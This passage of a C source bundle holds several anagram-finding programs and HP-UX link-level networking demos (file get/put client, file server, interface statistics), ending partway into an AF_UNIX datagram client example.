		 *	First a quick rudimentary check whether we have already
		 *	run out of any of the letters required.
		 */
		for (cp = cellp->word; *cp != '\0'; cp++) {
			if (freq[*cp] == 0) goto nextword;
		}

		/*
		 *	Now do a more careful counting check.
		 */
		nl = nleft;
		for (cp = cellp->word; *cp != '\0'; cp++) {
			if (freq[*cp] == 0) goto failure;
			freq[*cp]--; nl--;
		}

		/*
		 *	Yep, there were the letters left to make the word.
		 *	Are we done yet?
		 */
		switch (nl) {
		case 0:	/* Bingo */
			/* insert the final word */
			anagword[generation] = cellp;
			/* and print the phrase */
			print(0, generation);
			break;
		default:
			if (generation < maxgen-1) {
				/* Record the word and find something to follow it */
				/*
				 * Add it to the list of words that were ok for
				 * us; those words which we rejected are
				 * certainly not worth our children's attention.
				 * Constructed like a lifo stack.
				 */
				cellp->flink[generation+1] = myhead;
				if (myhead != NULL)
					myhead->rlink[generation+1] = cellp;
				else /* this is the first item on the list */
					mytail = cellp;
				myhead = cellp;
				myhead->rlink[generation+1] = NULL;

				/* record where we are for printing */
				anagword[generation] = cellp;
				/* and try all combinations of words
				 * on this stem */
				findanags(generation+1, mytail, nl);
			}
		}

failure:	/*
		 *	Restore freq to its former state
		 */
		cp2 = cellp->word;
		for (--cp; cp>=cp2; cp--) {
			freq[*cp]++;
		}
nextword:	;
	}
}
		
/*
 *	Procedure used to print out successful anagrams.
 *	Because of Optimisation #n, we have to churn out every combination
 *	of the words in anagword[0..gen]. Best done recursively.
 *
 *	Print anagram phrases indicated by anagword[0..gen].
 *	There are <gen> invocations of this procedure active above us.
 *	The words they are contemplating are available through
 *	idlist[0..gen-1]. Print the parents' words from there followed by
 *	every combination of the words dangling from anagword[gen..maxgen].
 */
print(gen, higen)
{
	static char *idlist[MAXWORDS];	/* list of our parents' words */

	if (gen == higen) {
		/* No further recursion; just print. */
		register idem_t *ip;	/* follow down anagword[higen] */
		register int i;		/* index along idlist */

		/* for each word in idemlist[gen], print the stem and it */
		for (ip = &(anagword[higen]->idem); ip != NULL; ip = ip -> link) {
			/* there must always be at least ONE word. */
			for (i=0; i<higen; i++) {
				fputs(idlist[i], stdout);
				putchar(' ');
			}
			puts(ip->word);
		}
	} else {
		/* recurse */
		register idem_t *ip;

		for (ip = &(anagword[gen]->idem); ip != NULL; ip = ip->link) {
			idlist[gen] = ip->word;
			print(gen+1, higen);
		}
	}

	(void) fflush(stdout);
}

/*
 *	Forge the reverse links to form a doubly-linked list
 *	Return the address of the tail of the list.
 */
cell_t *
forgelinks(head)
cell_t *head;
{
	cell_t *prev = NULL;	/* address of previous cell */
	cell_t *cp;		/* list follower */

	for (cp = head; cp != NULL; cp = cp->link) {
		cp -> flink[0] = cp -> link;
		cp -> rlink[0] = prev;
		prev = cp;
	}
	return(prev);
}

/*
 *	Save a copy of a string in some mallocked memory
 *	and pass back a pointer to it. 
 */
char *
savestr(oldstr)
char *oldstr;
{
	register char *cp;	/* roving pointer for character-grubbing */
	register char *np;	/* roving pointer into new string */
	char *newstr;		/* new copy of string to be passed back */

	/* find end of string for length */
	for (cp=oldstr; *cp != '\0'; cp++);

	newstr = malloc((unsigned) (cp-oldstr+1));	/* +1 for the null */
	if (newstr == NULL) oom("savestr");
	for (cp=oldstr, np=newstr; (*np++ = *cp++) != '\0'; );	/* copy */
	return(newstr);
}

printwordlist(head)
cell_t *head;
{
	cell_t *cp;	/* list tracer */
	idem_t *ip;	/* idem list tracer */
	int col = 0;	/* print column for word wrapping */
	int wordlen;	/* length of realword */

	for (cp = head; cp != NULL; cp = cp -> link) {
		for (ip = &(cp->idem); ip != NULL; ip = ip->link) {
			wordlen = strlen(ip->word);
			if (col + wordlen + 1 > 79) {
				putc('\n', stderr);
				col = 0;
			}
			if (col != 0) {
				putc(' ', stderr);
				col++;
			}
			fputs(cp->word, stderr);
			col += wordlen;
		}
	}
	putc('\n', stderr);
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef ANAGRAM5

/* anagram.c - compute anagrams */

/*
 * Copyright (C) 1999 Roger Willcocks
 * rogerw@centipede.co.uk
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License as
 * published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.
 */

/*
 * this is a fast anagram calculator. Given a dictionary file and a
 * phrase, it will find all the anagrams of the phrase.
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
#define MAXWORD 10000
 
typedef struct _pattern {
    long  x[4];
    char *word;
} pattern;
 
const long mask = 0x8888888L;
 
pattern phrase, word[MAXWORD];
int wordcount;
pattern *limit;
 
char buffer[30];
 
char *strsave(char *str)
{
    char *ret = new char [strlen(str) + 1];
    strcpy(ret, str);
    return ret;
}
 
extern "C" int callback(const void *p, const void *q)
{
    pattern *pp = (pattern *)p;
    pattern *pq = (pattern *)q;
    int retval = strlen(pq->word) - strlen(pp->word);
    if (retval == 0)
        return strcmp(pp->word, pq->word);
    return retval;
}
 
 
char *soln[100];
int count;
int trials, tests;
 
 
void anagrate(pattern *pword, int depth)
{
    if (depth == 4)
	return;

    if (phrase.x[0] == mask &&
        phrase.x[1] == mask &&
        phrase.x[2] == mask &&
        phrase.x[3] == mask) {
        printf("%d (%d, %d) ", count++, trials, tests);
        for (int i = 0; i < depth; i++)
            printf("%s ", soln[i]);
        printf("\n");
        return;
    }
 
    while (pword < limit) {
        if ((((phrase.x[0] - pword->x[0]) & mask) == mask) &&
            (((phrase.x[1] - pword->x[1]) & mask) == mask) &&
            (((phrase.x[2] - pword->x[2]) & mask) == mask) &&
            (((phrase.x[3] - pword->x[3]) & mask) == mask)) {
            soln[depth] = pword->word;
            pattern tt = phrase;
            phrase.x[0] = tt.x[0] - pword->x[0]; /* -= would get optimised to use remembered */
            phrase.x[1] = tt.x[1] - pword->x[1]; /* result from tests above; not wanted since */
            phrase.x[2] = tt.x[2] - pword->x[2]; /* most tests (~ 39/40) will fail */
            phrase.x[3] = tt.x[3] - pword->x[3];
            anagrate(pword, depth + 1);
            phrase = tt;
            trials++;
        }
        pword++;
        tests++;
    }
}
 
 
void addchar(pattern *pp, int c)
{
    if (c >= 'a' && c <= 'g') {
        pp->x[0] += (1L << (4 * (c - 'a')));
    }
    else if (c  >= 'h' && c <= 'n') {
        pp->x[1] += (1L << (4 * (c - 'h')));
    }
    else if (c  >= 'o' && c <= 'u') {
        pp->x[2] += (1L << (4 * (c - 'o')));
    }
    else if (c  >= 'v' && c <= 'z') {
        pp->x[3] += (1L << (4 * (c - 'v')));
    }
    if ((pp->x[1] & mask) ||
        (pp->x[1] & mask) ||
        (pp->x[2] & mask) ||
        (pp->x[3] & mask)) {
        fprintf(stderr, "too many '%c's in phrase\n", c);
    }
}
 
 
int main(int argc, char *argv[])
{
    // string is encoded as 26 * 4-bit fields
    // held internally as 4 * 32-bit ints
 
    // top bits of each set of four are 1, next three are count for that letter
 
    // subtract words - if top bit is still one, all's cool, otherwise
    // something underflowed and we can't use this word
 
    if (argc != 3) {
        fprintf(stderr, "usage: anagram <dictfile> <phrase>\n");
        return -4;
    }
 
    FILE *f = fopen(argv[1], "r");
    char *p;
 
    if (f == 0) {
        fprintf(stderr, "can't open dictionary file '%s'\n", argv[1]);
        return -3;
    }
 
    p = argv[2];
 
    while (*p)
        addchar(&phrase, *p++);
 
    phrase.x[0] |= mask;
    phrase.x[1] |= mask;
    phrase.x[2] |= mask;
    phrase.x[3] |= mask;
 
    while (fgets(buffer, sizeof(buffer), f)) {
        p = buffer;
 
        while (*p == ' ')
            p++;
        if (*p == '\n')
            continue;
 
        pattern tpat;
        tpat.x[0] = 0;
        tpat.x[1] = 0;
        tpat.x[2] = 0;
        tpat.x[3] = 0;
 
        while (*p && *p != '\n')
            addchar(&tpat, *p++);
 
        *p = 0;
        if ((((phrase.x[0] - tpat.x[0]) & mask) == mask) &&
            (((phrase.x[1] - tpat.x[1]) & mask) == mask) &&
            (((phrase.x[2] - tpat.x[2]) & mask) == mask) &&
            (((phrase.x[3] - tpat.x[3]) & mask) == mask)) {
            tpat.word = strsave(buffer); /* word is subset of phrase */
            word[wordcount++] = tpat;    /* so keep it */
        }
    }
 
    fclose(f);
 
    qsort(word, wordcount, sizeof(pattern), &callback);
 
    for (int x = 0; x < wordcount; x++)
        printf("%s ", word[x].word);
 
    printf("\n\n%d words\n", wordcount);
 
    limit = &word[wordcount];
    anagrate(&word[0], 0);
 
    return 0;
}

/* end */

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef ANAGRAM6

#include	"stdio.h"

char	string [20];			/* the string to "anagram" */
int	string_len;			/* length of same */

main (argc, argv)
int	argc;
char	*argv [];
{
	if (argc == 1)
	{
		printf ("Usage: anagram <string>\n");
		exit (-1);
	}
	strcpy (string, argv [1]);	/* copy string */
	string_len = strlen (string);	/* find length of it */
	anagram (0, string_len);	/* find all the anagrams */
}
 
anagram (start, length)
int	start;		/* index of the start we are interested in */
int	length;		/* no. of chars we are interested in */
{
	int	i;
 
	if (length == 1)		/* write out the anagram */
	{
		for (i = 0; i < string_len; i++)
			putchar (string [i]);
		putchar ('\n');
	}
	else
		for (i = 0; i < length; i++)
			if (i == 0)
				anagram (start + 1, length - 1);
			else
			{
				char	tmp;	/* temp for swap */
 
				tmp = string [start];	/* swap */
				string [start] = string [start + i];
				string [start + i] = tmp;
				anagram (start + 1, length - 1);
				tmp = string [start];	/* swap back */
				string [start] = string [start + i];
				string [start + i] = tmp;
			}
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef HPXNET

::::::::::::::
./usr/lib/demos/networking/LLA/ncopy.h
::::::::::::::
#define MAXDATA	1400
struct packet_format {
			int	id;
			short	mode;
			short	len;
			char	data[MAXDATA];
		      };
#define OVHEAD_SIZE	(sizeof(struct packet_format) - MAXDATA)
#define PACKET_SIZE	sizeof(struct packet_format)
#define RDOPEN	0
#define WROPEN	1
#define READ	2
#define WRITE	3
#define CLOSE	4
#define OK	5
#define ERR	6
#define REQ_SAP	0x10
#define SER_SAP 0x12
#define TIMEOUT_VALUE	10000
static char Uni_id[] = "@(#)1.3";

::::::::::::::
./usr/lib/demos/networking/LLA/nget.c
::::::::::::::
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <netio.h>

#include "ncopy.h"
extern char *net_aton();
extern 	errno;

main(argc,argv)
int	argc;
char	*argv[];
{
 struct packet_format rxbuf, txbuf;
 int f;
 int res;
 struct fis arg;

 if (argc != 3)
    {
     fprintf(stderr, "Usage: %s remote-file remote-addr\n",argv[0]);
     exit(__LINE__);
    }/*argc not 3 */

 /* set up the connection */
 f = open("/dev/lan0",O_RDWR);
 if (f < 0)
    {
     fprintf(stderr,"Cannot open, f = %d\n",res);
     fprintf(stderr,"Errno =%d\n",errno);
     exit(__LINE__);
    }/*bad open*/

/* setup the loacal/remote SAP */
 arg.reqtype = LOG_SSAP;
 arg.vtype = INTEGERTYPE;
 arg.value.i = REQ_SAP;
 res = ioctl(f,NETCTRL,&arg);
 if (res != 0)
    {
     fprintf(stderr,"Cannot control(LOG_SSAP), res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }/*bad ioctl call*/

 arg.reqtype = LOG_DSAP;
 arg.vtype = INTEGERTYPE;
 arg.value.i = SER_SAP;
 res = ioctl(f,NETCTRL,&arg);
 if (res != 0)
    {
     fprintf(stderr,"Cannot control(LOG_DSAP), res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }/*bad ioctl call*/

/* setup destination address */
 arg.reqtype = LOG_DEST_ADDR;
 arg.vtype = 6;
 net_aton(arg.value.s,argv[2],6);
 res = ioctl(f,NETCTRL,&arg);
 if (res != 0)
    {
     fprintf(stderr,"Cannot control(LOG_DEST_ADDR), res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

/* set timeout value */
 arg.reqtype = LOG_READ_TIMEOUT;
 arg.vtype = INTEGERTYPE;
 arg.value.i = TIMEOUT_VALUE;
 res = ioctl(f,NETCTRL,&arg);
 if (res)
    {
     fprintf(stderr,"Cannot control(LOG_READ_TIMEOUT), res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

/* network open */
 txbuf.mode = RDOPEN;
 txbuf.id = 0;
 txbuf.len = strlen(argv[1]) + 1; /*add 1 for null terminator*/
 strcpy(txbuf.data,argv[1]);
 res = write(f,&txbuf,txbuf.len+OVHEAD_SIZE);
 if (res <= 0)
    {
     fprintf(stderr,"Cannot write, res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 res = read(f,&rxbuf,PACKET_SIZE);
 if (res <=0)
    {
     fprintf(stderr,"Cannot read, res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 if (rxbuf.mode != OK)
    {
     fprintf("Remote open problem\n");
     exit(__LINE__);
    }

/* set up transmit frames */
 txbuf.mode =READ;
 txbuf.id = rxbuf.id;

/* REPEAT           *
 *  network read    *
 *  write(stdout)   *
 * UNTIL EOF(stdin) */

 do
    {
     txbuf.len = MAXDATA;
     res = write(f,&txbuf,OVHEAD_SIZE);
     if (res <= 0)
	{
	 fprintf(stderr,"Cannot write, res = %d\n",res);
	 fprintf(stderr,"Errno = %d\n",errno);
	 exit(__LINE__);
	}
     res = read(f,&rxbuf,PACKET_SIZE);
     if (res <= 0)
	{
	 fprintf(stderr,"Cannot read, res = %d\n",res);
	 fprintf(stderr,"Errno = %d\n",errno);
	 exit(__LINE__);
	}
     if (rxbuf.mode != OK)
	{
	 fprintf(stderr,"Remote write problem\n");
	 exit(__LINE__);
	}
     if (rxbuf.len > 0)
	{
	 res = write(1,rxbuf.data,rxbuf.len);
	 if (res < 0)
	    {
	     fprintf(stderr,"Cannot write(stdout), res = %d\n",res);
	     fprintf(stderr,"Errno = %d\n",errno);
	     exit(__LINE__);
	    }
	}
    } while (rxbuf.len > 0);

/* network close */
 txbuf.mode = CLOSE;
 txbuf.len = 0;
 res = write(f,&txbuf,txbuf.len+OVHEAD_SIZE);
 if (res <= 0)
    {
     fprintf(stderr,"Cannot write, res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 res = read(f,&rxbuf,PACKET_SIZE);
 if (res <= 0)
    {
     fprintf(stderr,"Cannot read, res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 if (rxbuf.mode != OK)
    {
     fprintf(stderr,"Remote close problem\n");
     exit(__LINE__);
    }

/* tear down the connection */
 res = close(f);
 if (res)
    {
     fprintf(stderr,"Cannot close, res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }
 exit(__LINE__);
}/*main*/
::::::::::::::
./usr/lib/demos/networking/LLA/nput.c
::::::::::::::
/******************************************
 * nput.c put a file on the remote system *
 ******************************************/

#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <netio.h>

#include "ncopy.h"

extern char *net_aton();
extern errno;

main(argc,argv)

int	argc;
char	*argv[];
{
 struct	packet_format rxbuf, txbuf;
 int f;
 int res;
 struct fis arg;
 int more;

 if (argc != 3)
    {
     fprintf(stderr,"Usage: %s remote-file remote-addr\n",argv[0]);
     exit(__LINE__);
    }
 
 f = open("/dev/lan0",O_RDWR);
 if (f < 0)
    {
     fprintf(stderr,"Cannot open, f= %d\n",f);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }
 
 arg.reqtype = LOG_SSAP;
 arg.vtype = INTEGERTYPE;
 arg.value.i = REQ_SAP;
 res = ioctl(f, NETCTRL,&arg);
 if (res)
    {
     fprintf(stderr,"Cannot control(LOG_SSAP), res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 arg.reqtype = LOG_DSAP;
 arg.vtype = INTEGERTYPE;
 arg.value.i = SER_SAP;
 res = ioctl(f, NETCTRL,&arg);
 if (res)
    {
     fprintf(stderr,"Cannot control(LOG_DSAP), res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 arg.reqtype = LOG_DEST_ADDR;
 arg.vtype = 6;
 net_aton(arg.value.s,argv[2],6);
 res = ioctl(f,NETCTRL,&arg);
 if (res)
    {
     fprintf(stderr,"Cannot control(LOG_DEST_ADDR), res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 arg.reqtype = LOG_READ_TIMEOUT;
 arg.vtype = INTEGERTYPE;
 arg.value.i = TIMEOUT_VALUE;
 res = ioctl(f, NETCTRL,&arg);
 if (res)
    {
     fprintf(stderr,"Cannot control(LOG_READ_TIMEOUT) res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 /* NETWORK OPEN */

 txbuf.mode = WROPEN;
 txbuf.id = 0;
 txbuf.len = strlen(argv[1]) + 1;  /*add 1 for null terminator*/
 strcpy(txbuf.data,argv[1]);
 res = write(f,&txbuf, txbuf.len+OVHEAD_SIZE);
 if (res <= 0)
    {
     fprintf(stderr,"Cannot write, res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 res = read(f,&rxbuf,PACKET_SIZE);
 if (res <= 0)
    {
     fprintf(stderr,"Cannot read, res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 if (rxbuf.mode != OK)
    {
     fprintf(stderr,"Remote open problem\n");
     exit(__LINE__);
    }

/* set up transmit frames */

 txbuf.mode = WRITE;
 txbuf.id = rxbuf.id;

/* begin loop*/

 while (1)
    {
     res = read(0,txbuf.data,MAXDATA);
     if (res < 0)
	{
	 fprintf(stderr,"Cannot read stdin, res = %d\n",res);
	 fprintf(stderr,"Errno = %d\n",errno);
	 exit(__LINE__);
	}

     if (res == 0) break;	/*loop exit at eof(stdin)*/

     txbuf.len = res;
     res = write(f,&txbuf,res+OVHEAD_SIZE);
     if (res <= 0)
	{
	 fprintf(stderr,"Cannot write, res = %d\n",res);
	 fprintf(stderr,"Errno = %d\n",errno);
	 exit(__LINE__);
	}

     res = read(f,&rxbuf,PACKET_SIZE);
     if (res <= 0)
	{
	 fprintf(stderr,"Cannot read, res = %d\n",res);
	 fprintf(stderr,"Errno = %d\n",errno);
	 exit(__LINE__);
	}
     
     if (rxbuf.mode != OK)
	{
	 fprintf(stderr,"Remote write problem\n");
	 exit(__LINE__);
	}

    }/*while loop*/

/* network close */

 txbuf.mode = CLOSE;
 txbuf.len = 0;
 res = write(f,&txbuf, txbuf.len +OVHEAD_SIZE);
 if (res <= 0)
    {
     fprintf(stderr, "Cannot write, res = %d\n",res);
     fprintf(stderr, "Errno = %d\n",errno);
     exit(__LINE__);
    }

 
 res = read(f,&rxbuf, PACKET_SIZE);
 if (res <= 0)
    {
     fprintf(stderr, "Cannot read, res = %d\n",res);
     fprintf(stderr, "Errno = %d\n",errno);
     exit(__LINE__);
    }

 if (rxbuf.mode != OK)
    {
     fprintf(stderr,"Remote close problem\n");
     exit(__LINE__);
    }

 /* tear down network */
  
  res = close(f);
  if (res)
     {
      fprintf(stderr,"Cannot close, res = %d\n",res);
      fprintf(stderr,"Errno = %d\n",errno);
      exit(__LINE__);
     }

 exit(__LINE__);
}/*main*/
::::::::::::::
./usr/lib/demos/networking/LLA/nserver.c
::::::::::::::
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <netio.h>
#include "ncopy.h"

extern char *net_aton();
extern errno;

main(argc,argv)
int argc;
char *argv[];
{
 struct packet_format rxbuf, txbuf;
 int f;
 int res;
 struct fis arg;
 short size;

 if (argc != 1)
    {
     fprintf(stderr,"usage: %s\n",argv[0]);
     exit(__LINE__);
    }

 f= open("/dev/lan0",O_RDWR);
 if (f < 0)
    {
     fprintf(stderr,"Cannot open, f = %d\n",f);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 arg.reqtype = LOG_SSAP;
 arg.vtype = INTEGERTYPE;
 arg.value.i = SER_SAP;
 res = ioctl(f,NETCTRL,&arg);
 if (res != 0)
    {
     fprintf(stderr,"Cannot control(LOG_SSAP), res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 arg.reqtype = LOG_DSAP;
 arg.vtype = INTEGERTYPE;
 arg.value.i = REQ_SAP;
 res = ioctl(f,NETCTRL,&arg);
 if (res != 0)
    {
     fprintf(stderr,"Cannot control(LOG_DSAP), res = %d\n",res);
     fprintf(stderr,"Errno = %d\n",errno);
     exit(__LINE__);
    }

 while (1)
    {
     res = read(f, &rxbuf, PACKET_SIZE);
     if (res <= 0)
	{
	 fprintf(stderr, "Cannot read, res = %d\n",res);
	 fprintf(stderr, "Errno = %d\n", errno);
	 exit(__LINE__);
	}
     switch( rxbuf.mode)
	{
	 case WROPEN:
	    printf("Servicing open for write: %s\n", rxbuf.data);
	    res = open(rxbuf.data, O_WRONLY|O_CREAT, 0644);
	    if (res < 0)
	       {
		printf("  cannot open, res = %d\n",res);
		printf("  errno = %d\n",errno);
		txbuf.mode = ERR;
	       }
	    else
	       {
		printf("  returned file descriptor %d\n",res);
		txbuf.mode = OK;
	       }
	    txbuf.id = res;
	    txbuf.len = 0;
	    size = OVHEAD_SIZE;
	    break;

	 case RDOPEN:
	    printf("Servicing open for read: %s\n", rxbuf.data);
	    res = open(rxbuf.data,O_RDONLY);
	    if (res < 0)
	       {
		printf("  cannot open, res = %d\n",res);
		printf("  errno = %d\n",errno);
		txbuf.mode = ERR;
	       }
	    else
	       {
		printf("  returned file descriptor %d\n",res);
		txbuf.mode = OK;
	       }
	    txbuf.id = res;
	    txbuf.len = 0;
	    size = OVHEAD_SIZE;
	    break;
	 
	 case READ:
	    printf("Servicing read: %d\n",rxbuf.id);
	    res = read(rxbuf.id, txbuf.data, rxbuf.len);
	    if (res < 0)
	       {
		printf("  cannot read, res = %d\n", res);
		printf("  errno = %d\n",errno);
		txbuf.mode = ERR;
		txbuf.len = 0;
		size = OVHEAD_SIZE + res;
	       }
	    else
	       {
		printf("  read %d bytes\n",res);
		txbuf.mode = OK;
		txbuf.len = res;
		size = OVHEAD_SIZE + res;
	       }
	    txbuf.id = rxbuf.id;
	    break;

	 case WRITE:
	    printf("Servicing write: %d\n",rxbuf.id);
	    res = write(rxbuf.id, rxbuf.data, rxbuf.len);
	    if (res < 0)
	       {
		printf("  cannot write, res = %d\n",res);
		printf("  errno = %d\n",errno);
		txbuf.mode = ERR;
	       }
	    else
	       {
		printf("  write %d bytes\n",res);
		txbuf.mode = OK;
	       }
	    txbuf.len = res;
	    txbuf.id = rxbuf.id;
	    size = OVHEAD_SIZE;
	    break;

	 case CLOSE:
	    printf("Servicing close: %d\n",rxbuf.id);
	    res = close(rxbuf.id);
	    if (res != 0)
	       {
		printf("  cannot close, res = %d\n",res);
		printf("  errno =%d\n",errno);
	       }
	    else
	       {
		printf("  closed file\n");
		txbuf.mode = OK;
	       }
	    txbuf.len = 0;
	    txbuf.id = -1;
	    size = OVHEAD_SIZE;
	    break;

	 default:
	    printf("Unrecognized request %d\n",rxbuf.mode);
	    txbuf.mode = ERR;
	    txbuf.len = 0;
	    txbuf.id = -1;
	    size = OVHEAD_SIZE;
	    break;
	}
     
/* setup the dest addr by reading source addr of the request packet */

     arg.reqtype = FRAME_HEADER;
     res = ioctl(f, NETSTAT, &arg);
     if (res != 0)
	{
	 fprintf(stderr, "Cannot status(FRAME_HEADER), res = %d\n",res);
	 fprintf(stderr, "Errno = %d\n",errno);
	 exit(__LINE__);
	}

     arg.reqtype = LOG_DEST_ADDR;
     arg.vtype = 6;
     copy(arg.value.s,&arg.value.s[6],6);
     res = ioctl(f, NETCTRL,&arg);
     if (res != 0)
	{
	 fprintf(stderr,"Cannot control(LOG_DEST_ADDR), res = %d\n",res);
	 fprintf(stderr,"Errno = %d\n",errno);
	 exit(__LINE__);
	}

/* write reply packet */
     res = write(f, &txbuf, size);
     if (res <= 0)
	{fprintf(stderr,"Cannot write, res = %d\n",res);
	 fprintf(stderr,"errno = %d\n",errno);
	 exit(__LINE__);
	}
    }
}

/* copy exactly 'num' bytes */

copy(to,from,num)
register char *to,
	      *from;
register int num;
{
 while(num-- > 0)
    *to++ = *from++;
}
	
::::::::::::::
./usr/lib/demos/networking/LLA/nstatus.c
::::::::::::::
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/netio.h>

extern errno;

int map[] =
    {
	RX_FRAME_COUNT,
	TX_FRAME_COUNT,
	UNDEL_RX_FRAMES,
	UNTRANS_FRAMES,
	RX_BAD_CRC_FRAMES,
	ONE_COLLISION,
	MORE_COLLISIONS,
	EXCESS_RETRIES,
	DEFERRED,
	CARRIER_LOST,
	NO_HEARTBEAT,
	ALIGNMENT_ERRORS,
	LATE_COLLISIONS,
	MISSED_FRAMES,
	UNKNOWN_PROTOCOL,
	BAD_CONTROL_FIELD,
#ifdef hp9000s800
	ILLEGAL_FRAME_SIZE,
	NO_TX_SPACE,
	LITTLE_RX_SPACE,
	RX_XID,
	RX_TEST,
	RX_SPECIAL_DROPPED,
	ARQ_STATUS
#endif
   };

#define NUM_STAT	(sizeof(map) / sizeof(int))
	  

char *descript[] =
   {
	"RX_FRAME_COUNT",
	"TX_FRAME_COUNT",
	"UNDEL_RX_FRAMES",
	"UNTRANS_FRAMES",
	"RX_BAD_CRC_FRAMES",
	"ONE_COLLISION",
	"MORE_COLLISIONS",
	"EXCESS_RETRIES",
	"DEFERRED",
	"CARRIER_LOST",
	"NO_HEARTBEAT",
	"ALIGNMENT_ERRORS",
	"LATE_COLLISIONS",
	"MISSED_FRAMES",
	"UNKNOWN_PROTOCOL",
	"BAD_CONTROL_FIELD",
#ifdef hp9000s800
	"ILLEGAL_FRAME_SIZE",
	"NO_TX_SPACE",
	"LITTLE_RX_SPACE",
	"RX_XID",
	"RX_TEST",
	"RX_SPECIAL_DROPPED",
	"ARQ_STATUS"
#endif
   };

char *desc_status[] =
   {	"INACTIVE",
	"INITIALIZING",
	"ACTIVE",
	"FAILED",
	"UNKNOWN"
   };

#define UNKNOWN ((FAILED)+1)

main(argc,argv)

int argc;
char *argv[];
{
 int f;
 int res;
 int stat;
 struct fis arg;
 char addr[15];

 if (argc !=2)
    {
     fprintf(stderr,"Usage: %s device-file\n",argv[0]);
     exit(-1);
    }

 f= open(argv[1],O_RDWR);
 if (f < 0)
    {
     fprintf(stderr,"Cannot open device file %s\n",argv[1]);
     fprintf(stderr,"   errno = %d\n",errno);
     exit(__LINE__);
    }

 arg.reqtype = LOCAL_ADDRESS;
 res = ioctl(f,NETSTAT,&arg);
 if (res)
    {
     fprintf(stderr,"Cannot read LOCAL_ADDRESS\n");
     fprintf(stderr,"  errno = %d\n",errno);
     exit(-1);
    }
if (!(net_ntoa(addr,arg.value.s,6)))
   {
    fprintf(stderr,"Error in converting address\n");
    exit(-1);
   }
printf("%30s : %s\n","LOCAL_ADDRESS",addr);


 arg.reqtype = DEVICE_STATUS;
 res = ioctl(f,NETSTAT, &arg);
 if (res)
    {
     fprintf(stderr,"Cannot read device status\n");
     fprintf(stderr,"  errno = %d\n",errno);
     exit(-1);
    }

 if (arg.value.i > FAILED || arg.value.i < INACTIVE) arg.value.i = UNKNOWN;
 printf("%30s : %s\n", "DEVICE_STATUS", desc_status[arg.value.i]);

 for (stat=0; stat <NUM_STAT; stat++)
    {
     arg.reqtype = map[stat];
     res = ioctl(f,NETSTAT,&arg);
     if (res)
        {
	 fprintf(stderr,"Cannot read statistic %s\n", descript[stat]);
	 fprintf(stderr,"  errno = %d\n",errno);
	 exit(-1);
	}
     printf("%30s : %d\n", descript[stat], arg.value.i);
    }
 exit(0);
}
::::::::::::::
./usr/lib/demos/networking/af_unix/dgram/client.c
::::::::::::::
/*
* 	AF_UNIX datagram client process
*
*	This is an example program that demonstrates the use of AF_UNIX
*	datagram sockets as a BSD IPC mechanism.  This contains the
*	client, and is intended to operate in conjunction with the
*	server program.
*
*/
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/un.h>
#include <stdio.h>
#include <signal.h>
#include <netdb.h>

#define SOCKET_PATH 	"/tmp/myserver"
#define SOCKET_PATHCLNT "/tmp/my_af_unix_client"
#define bzero(ptr, len)  memset((ptr), NULL, (len))
int	timeout();

main()
{
	int	sock;
	int	j, slen, rlen;
	unsigned char	sdata[2000];		/* send data */
	unsigned char	rdata[2000];		/* receive data */
	struct  sockaddr_un servaddr;		/* address of server */
	struct  sockaddr_un clntaddr;		/* address of client */
	struct  sockaddr_un from;
	int	fromlen;

	/* 	Stop the program if not done in 2 minutes */

	signal(SIGALRM, timeout);
	alarm((unsigned long) 120);	

	/*	Fork the server process to receive data from client */

	printf("Client : Forking server\n");
	if (fork() == 0 ) {
		execl("./server", "server", 0 );
		printf("Cannot exec ./server.\n");
		exit(1);
	}

	/*	Initialize the send data	*/

	for (j = 0; j < sizeof(sdata); j++)
		sdata[j] = (char) j;

	/*	Create a UNIX datagram socket for client	*/

	if ((sock = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) {
		perror("client: socket");
		exit(2);
	}

	/*	Client will bind to an address so server will get
